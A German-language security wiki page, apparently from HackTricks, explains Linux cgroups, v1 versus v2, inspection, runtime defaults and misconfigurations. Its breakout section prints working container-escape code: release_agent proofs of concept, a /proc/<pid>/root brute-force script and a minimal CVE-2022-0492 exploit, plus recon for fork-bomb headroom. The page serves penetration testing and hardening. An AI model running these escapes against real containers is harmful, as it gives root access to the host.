# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## Überblick

Linux **control groups** sind der Kernel-Mechanismus, mit dem Prozesse für Abrechnung, Begrenzung, Priorisierung und Durchsetzung von Richtlinien gruppiert werden. Wenn namespaces hauptsächlich dazu dienen, die Sicht auf Ressourcen zu isolieren, dienen cgroups hauptsächlich dazu zu steuern, **wie viel** dieser Ressourcen eine Gruppe von Prozessen verbrauchen darf und, in einigen Fällen, **welche Klassen von Ressourcen** sie überhaupt ansprechen dürfen. Container verlassen sich ständig auf cgroups, auch wenn der Benutzer nie direkt hinsieht, weil fast jede moderne runtime dem Kernel mitteilen muss "diese Prozesse gehören zu diesem Workload, und dies sind die Ressourcenvorgaben, die für sie gelten".

Deshalb platzieren Container-Engines einen neuen Container in seinen eigenen cgroup-Subbaum. Sobald der Prozessbaum dort liegt, kann die runtime den Speicher begrenzen, die Anzahl der PIDs einschränken, die CPU-Nutzung gewichten, I/O regulieren und den Gerätezugriff beschränken. In einer Produktionsumgebung ist das sowohl für Multi-Tenant-Sicherheit als auch für einfache betriebliche Hygiene unerlässlich. Ein Container ohne sinnvolle Ressourcenbeschränkungen kann Speicher erschöpfen, das System mit Prozessen fluten oder CPU und I/O so monopolisieren, dass der Host oder benachbarte Workloads instabil werden.

Aus Sicherheitssicht sind cgroups in zweierlei Hinsicht wichtig. Erstens ermöglichen schlechte oder fehlende Ressourcenlimits einfache Denial-of-Service-Angriffe. Zweitens haben einige cgroup-Funktionen, insbesondere in älteren **cgroup v1**-Setups, historisch mächtige breakout primitives ermöglicht, wenn sie von innen einem Container beschreibbar waren.

## v1 Vs v2

Es gibt zwei gängige cgroup-Modelle. **cgroup v1** stellt mehrere Controller-Hierarchien bereit, und ältere exploit writeups drehen sich oft um die dort verfügbaren ungewöhnlichen und manchmal übermächtigen Semantiken. **cgroup v2** führt eine einheitlichere Hierarchie und im Allgemeinen saubereres Verhalten ein. Moderne Distributionen bevorzugen zunehmend cgroup v2, aber gemischte oder Legacy-Umgebungen existieren weiterhin, was bedeutet, dass beide Modelle bei der Überprüfung realer Systeme relevant bleiben.

Der Unterschied ist wichtig, weil einige der bekanntesten Container-Breakout-Geschichten, wie der Missbrauch von **`release_agent`** in cgroup v1, sehr spezifisch mit älterem cgroup-Verhalten verknüpft sind. Ein Leser, der einen cgroup exploit in einem Blog sieht und ihn dann blind auf ein modernes, nur mit cgroup v2 betriebenes System anwendet, wird wahrscheinlich missverstehen, was auf dem Ziel tatsächlich möglich ist.

## Inspection

Der schnellste Weg, um zu sehen, wo sich deine aktuelle Shell befindet, ist:
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
`/proc/self/cgroup` zeigt die mit dem aktuellen Prozess verknüpften cgroup-Pfade an. Auf einem modernen cgroup v2 Host sieht man häufig einen einheitlichen Eintrag. Auf älteren oder hybriden Hosts sieht man möglicherweise mehrere v1-Controller-Pfade. Sobald man den Pfad kennt, kann man die entsprechenden Dateien unter `/sys/fs/cgroup` prüfen, um Limits und die aktuelle Nutzung einzusehen.

Auf einem cgroup v2 Host sind die folgenden Befehle nützlich:
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
Diese Dateien zeigen, welche Controller existieren und welche an untergeordnete cgroups delegiert sind. Dieses Delegationsmodell ist in rootless- und systemd-managed-Umgebungen wichtig, da die runtime möglicherweise nur die Teilmenge der cgroup-Funktionalität steuern kann, die die übergeordnete Hierarchie tatsächlich delegiert.

## Labor

Eine Möglichkeit, cgroups in der Praxis zu beobachten, ist, einen speicherlimitierten Container auszuführen:
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
Sie können auch einen PID‑begrenzten Container ausprobieren:
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
Diese Beispiele sind nützlich, weil sie helfen, die runtime-Flag mit der Kernel-Dateischnittstelle zu verknüpfen. Die runtime setzt die Regel nicht durch Magie durch; sie schreibt die relevanten cgroup-Einstellungen und lässt dann den Kernel diese gegenüber dem Prozessbaum durchsetzen.

## Runtime-Verwendung

Docker, Podman, containerd und CRI-O verlassen sich alle im normalen Betrieb auf cgroups. Die Unterschiede betreffen in der Regel nicht, ob sie cgroups verwenden, sondern **welche Standardeinstellungen sie wählen**, **wie sie mit systemd interagieren**, **wie rootless-Delegation funktioniert**, und **wie viel der Konfiguration auf Engine-Ebene gegenüber der Orchestrierungs-Ebene kontrolliert wird**.

In Kubernetes werden Ressourcenanforderungen und -limits schließlich zur cgroup-Konfiguration auf dem Node. Der Weg vom Pod YAML zur Durchsetzung durch den Kernel führt über kubelet, den CRI runtime und den OCI runtime, aber cgroups sind weiterhin der Kernel-Mechanismus, der die Regel letztendlich anwendet. In Incus/LXC-Umgebungen werden cgroups ebenfalls stark genutzt, insbesondere weil system containers oft einen reichhaltigeren Prozessbaum und mehr VM-ähnliche Betriebserwartungen offenlegen.

## Fehlkonfigurationen und Breakouts

Die klassische cgroup-Sicherheitsgeschichte ist der beschreibbare **cgroup v1 `release_agent`**-Mechanismus. In diesem Modell könnte der Kernel, wenn ein Angreifer in der Lage wäre, in die richtigen cgroup-Dateien zu schreiben, `notify_on_release` zu aktivieren und den in `release_agent` gespeicherten Pfad zu kontrollieren, beim Leeren der cgroup in den initial namespaces auf dem Host einen vom Angreifer gewählten Pfad ausführen. Deshalb legen ältere Artikel so viel Wert auf die Schreibbarkeit von cgroup-Controllern, Mount-Optionen und Namespace-/Capability-Bedingungen.

Selbst wenn `release_agent` nicht verfügbar ist, sind cgroup-Fehler weiterhin relevant. Zu breite Gerätezugriffe können Host-Geräte aus dem Container erreichbar machen. Fehlende Speicher- und PID-Limits können eine einfache Codeausführung in einen Host DoS verwandeln. Schwache cgroup-Delegation in rootless-Szenarien kann Verteidiger außerdem in die Irre führen, indem sie annehmen, eine Einschränkung existiere, obwohl die runtime sie nie tatsächlich anwenden konnte.

### Hintergrund von `release_agent`

Die `release_agent`-Technik gilt nur für **cgroup v1**. Die Grundidee ist, dass, wenn der letzte Prozess in einer cgroup beendet wird und `notify_on_release=1` gesetzt ist, der Kernel das Programm ausführt, dessen Pfad in `release_agent` gespeichert ist. Diese Ausführung erfolgt in den **initial namespaces auf dem Host**, was einen beschreibbaren `release_agent` in eine Container-Escape-Primitive verwandelt.

### Damit die Technik funktioniert, benötigt der Angreifer in der Regel:

- eine beschreibbare **cgroup v1**-Hierarchie
- die Möglichkeit, eine Child-cgroup zu erstellen oder zu benutzen
- die Möglichkeit, `notify_on_release` zu setzen
- die Möglichkeit, einen Pfad in `release_agent` zu schreiben
- einen Pfad, der aus Sicht des Hosts zu einer ausführbaren Datei auflöst

### Klassischer PoC

Der historische Einzeiler-PoC ist:
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
Dieses PoC schreibt einen payload path in `release_agent`, löst cgroup release aus und liest anschließend die vom Host erzeugte Ausgabedatei aus.

### Lesbare Schritt-für-Schritt-Anleitung

Das gleiche Prinzip lässt sich leichter verstehen, wenn man es in Schritte unterteilt.

1. Erstelle und bereite eine schreibbare cgroup vor:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. Identifiziere den Host-Pfad, der dem Container-Dateisystem entspricht:
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. Lege eine payload ab, die vom Host-Pfad aus sichtbar ist:
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. Ausführung auslösen, indem du die cgroup leer machst:
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
Die Folge ist die Ausführung des payloads auf dem Host mit Root-Rechten des Hosts. In einem realen exploit schreibt der payload üblicherweise eine proof file, startet eine reverse shell oder verändert den Zustand des Hosts.

### Relative-Pfad-Variante mit `/proc/<pid>/root`

In einigen Umgebungen ist der Host-Pfad zum Container-Dateisystem nicht offensichtlich oder wird vom storage driver verborgen. In diesem Fall kann der payload-Pfad über `/proc/<pid>/root/...` angegeben werden, wobei `<pid>` eine Host-PID eines Prozesses im aktuellen Container ist. Das ist die Grundlage der Brute-Force-Variante mit relativen Pfaden:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
Der relevante Trick hier ist nicht brute force an sich, sondern die Pfadform: `/proc/<pid>/root/...` erlaubt es dem Kernel, eine Datei innerhalb des Container-Dateisystems aus dem Host-Namespace aufzulösen, selbst wenn der direkte Host-Speicherpfad nicht im Voraus bekannt ist.

### CVE-2022-0492 Variante

Im Jahr 2022 zeigte CVE-2022-0492, dass das Schreiben auf `release_agent` in cgroup v1 nicht korrekt auf `CAP_SYS_ADMIN` im **initialen** user namespace geprüft wurde. Das machte die Technik auf verwundbaren Kerneln deutlich leichter zugänglich, weil ein Containerprozess, der eine cgroup-Hierarchie mounten konnte, `release_agent` schreiben konnte, ohne bereits im Host-User-Namespace privilegiert zu sein.

Minimaler Exploit:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
Auf einem verwundbaren Kernel führt der Host `/proc/self/exe` mit Root-Rechten des Hosts aus.

Für praktischen Missbrauch beginnen Sie damit zu prüfen, ob die Umgebung noch beschreibbare cgroup-v1-Pfade oder gefährlichen Gerätezugriff exponiert:
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
Wenn `release_agent` vorhanden und beschreibbar ist, befinden Sie sich bereits im legacy-breakout-Bereich:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
Wenn der cgroup path selbst keinen escape ermöglicht, ist die nächste praktische Verwendung oft denial of service oder reconnaissance:
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
Diese Befehle sagen Ihnen schnell, ob die Workload Platz hat, einen fork-bomb auszuführen, den Speicher aggressiv zu verbrauchen oder eine beschreibbare veraltete cgroup-Schnittstelle zu missbrauchen.

## Prüfungen

Bei der Überprüfung eines Ziels dienen die cgroup-Prüfungen dazu zu ermitteln, welches cgroup-Modell genutzt wird, ob der Container beschreibbare Controller-Pfade sieht und ob alte breakout primitives wie `release_agent` überhaupt relevant sind.
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
What is interesting here:

- If `mount | grep cgroup` shows **cgroup v1**, older breakout writeups become more relevant.
- If `release_agent` exists and is reachable, that is immediately worth deeper investigation.
- If the visible cgroup hierarchy is writable and the container also has strong capabilities, the environment deserves much closer review.

If you discover **cgroup v1**, writable controller mounts, and a container that also has strong capabilities or weak seccomp/AppArmor protection, that combination deserves careful attention. cgroups are often treated as a boring resource-management topic, but historically they have been part of some of the most instructive container escape chains precisely because the boundary between "resource control" and "host influence" was not always as clean as people assumed.

## Runtime Defaults

| Runtime / Plattform | Standardzustand | Standardverhalten | Häufige manuelle Schwächung |
| --- | --- | --- | --- |
| Docker Engine | Standardmäßig aktiviert | Container werden automatisch in cgroups eingeordnet; Ressourcenlimits sind optional, sofern sie nicht durch Flags gesetzt werden | Auslassen von `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`; `--device`; `--privileged` |
| Podman | Standardmäßig aktiviert | `--cgroups=enabled` ist der Standard; die Default-Werte des cgroup-Namespace variieren je nach cgroup-Version (`private` bei cgroup v2, `host` bei einigen cgroup v1-Setups) | `--cgroups=disabled`, `--cgroupns=host`, gelockerter Gerätezugriff, `--privileged` |
| Kubernetes | Standardmäßig durch die Runtime aktiviert | Pods und Container werden vom Node-Runtime in cgroups eingeordnet; feingranulare Ressourcensteuerung hängt von `resources.requests` / `resources.limits` ab | Auslassen von Ressourcenanforderungen/-limits, privilegierter Gerätezugriff, Fehlkonfiguration der Runtime auf Host-Ebene |
| containerd / CRI-O | Standardmäßig aktiviert | cgroups sind Teil des normalen Lifecycle-Managements | Direkte Runtime-Konfigurationen, die Gerätebeschränkungen lockern oder legacy beschreibbare cgroup v1-Interfaces exponieren |

Die wichtige Unterscheidung ist, dass das Vorhandensein von **cgroup** normalerweise Standard ist, während **nützliche Ressourcenbeschränkungen** oft optional sind, sofern sie nicht explizit konfiguriert wurden.
